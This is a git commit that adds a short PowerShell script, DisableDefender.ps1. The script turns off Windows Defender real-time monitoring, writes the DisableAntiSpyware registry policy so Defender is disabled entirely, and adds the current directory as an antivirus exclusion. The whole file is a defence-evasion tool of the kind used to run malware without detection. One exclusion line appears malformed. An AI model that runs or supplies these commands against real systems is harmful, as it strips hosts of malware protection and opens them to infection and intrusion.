05c985247f4843b64ffcbc51eb53fa5128981cf5
Jacob Brumbaugh <80926733+m0rtifiedpenguin@users.noreply.github.com>
2024-10-18 00:02:55 -0400

    Create DisableDefender.ps1

---
+++ Scripts/DisableDefender.ps1
@@ -0,0 +1,17 @@
+# Disables Windows Defender
+
+# Checks the status of antimalware software
+Get-MpComputerStatus
+
+# Checks exclusions for Microsoft Defender
+Get-MpPreference | select Exclusion* | fl
+
+# Disables Defender Real Time Monitoring
+Set-MpPreference -DisableRealtimeMonitoring $true
+
+# Completely disables Windows Defender Antivirus on a computer
+New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force
+
+# Set exclusion path
+Set-MpPreference -ExclusionPath (pwd) -disablerealtimemonitoring
+Add-MpPreference -ExclusionPath (pwd)
